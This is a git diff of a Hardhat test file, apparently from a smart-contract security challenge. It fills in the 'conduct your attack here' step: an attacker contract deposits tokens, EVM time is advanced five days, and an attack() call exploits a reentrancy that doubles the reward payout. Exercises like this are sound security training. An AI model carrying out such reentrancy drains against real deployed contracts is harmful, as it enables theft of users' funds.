@@ -49,10 +49,29 @@ describe(NAME, function () {
 		});
 
 		// prettier-ignore
-		it("conduct your attack here", async function () {
-  
-      });
+        it("conduct your attack here", async function () {
+            // deposit our token
+            await attackerContract
+                .connect(attackerWallet)
+                .deposit(rewardTokenContract.address, NFTToStakeContract.address, depositoorContract.address);
 
+            // another syntax
+            // await network.provider.send(
+            //     "evm_increaseTime",
+            //     [5 * 24 * 60 * 60 + 1] // 5 days
+            // );
+
+            await network.provider.request({
+                method: "evm_increaseTime",
+                params: [5 * 24 * 60 * 60 + 1], // 5 days
+            });
+
+            // the REWARD_RATE is 10 tokens/day
+            // so after 5 days our benefits will be 50 tokens
+            // but there will be a reentrancy
+            // so our final benefits will be 100 tokens
+            await attackerContract.connect(attackerWallet).attack();
+        });
 		after(async function () {
 			expect(await rewardTokenContract.balanceOf(attackerContract.address)).to.be.equal(
 				ethers.utils.parseEther('100'),
